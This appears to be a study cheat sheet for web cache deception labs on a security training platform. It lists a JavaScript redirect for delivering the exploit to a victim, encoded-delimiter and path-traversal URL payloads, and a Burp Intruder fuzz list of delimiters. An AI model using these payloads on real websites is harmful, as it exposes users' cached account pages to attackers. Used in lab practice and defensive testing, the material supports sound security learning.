# Web Cache Deception — Scripts & Payloads

## Exploit Delivery Script

Basic forced redirect to deliver to victim:
```html
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/ATTACK-URL"</script>
```

With cache buster parameter:
```html
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"</script>
```

---

## Attack URL Structures

### Path Mapping
```
/my-account/foo.js
/my-account/abc.css
/my-account/anything.ico
```

### Delimiter Discrepancy
```
/my-account;foo.js
/my-account;abc.css
/my-account;wcd.js
```

### Encoded Delimiter Discrepancy
```
/my-account%3bfoo.js       (%3b = ;)
/my-account%23foo.css      (%23 = #)
/my-account%00foo.js       (%00 = null)
/my-account%0afoo.js       (%0a = newline)
/my-account%09foo.js       (%09 = tab)
/myaccount%3fwcd.css       (%3f = ?)
```

### Static Directory — Server Normalizes
```
/resources/..%2fmy-account
/static/..%2fmy-account
/assets/..%2fmy-account
```

### Static Directory — Cache Normalizes
```
/my-account;%2f%2e%2e%2fstatic
/my-account;%2f%2e%2e%2fresources
/my-account;%2f%2e%2e%2fassets
```

---

## Burp Intruder Setup

### Payload Position
```
/my-account§§abc
```

### Delimiter Characters to Test
```
;
?
#
&
%
=
+
~
|
@
!
%3b
%3f
%23
%00
%0a
%09
```

**Important:** Turn off URL encoding in Intruder:
```
Payloads panel → Payload encoding → Deselect "URL-encode these characters"
```

---

## Normalization Test Payloads

### Origin Server Test (use POST endpoint)
```
/aaa/..%2fmy-account
/aaa/..%2fprofile
```

### Cache Server Test
```
/aaa/..%2fresources/js/file.js    ← traversal before prefix
/resources/..%2fjs/file.js        ← traversal after prefix
/resources/aaa                     ← confirm prefix rule
```

### Fully Encoded Traversal (cache normalizes scenario)
```
%2f%2e%2e%2f   =   /../

/my-account%2f%2e%2e%2fresources
/profile%2f%2e%2e%2fstatic
```

---

## Static Extensions to Try

```
.js
.css
.ico
.exe
.png
.jpg
.svg
.txt
.html
.json
```

---

## Common Static Directory Prefixes to Look For

```
/static/
/assets/
/resources/
/scripts/
/images/
/cdn/
/public/
/media/
```
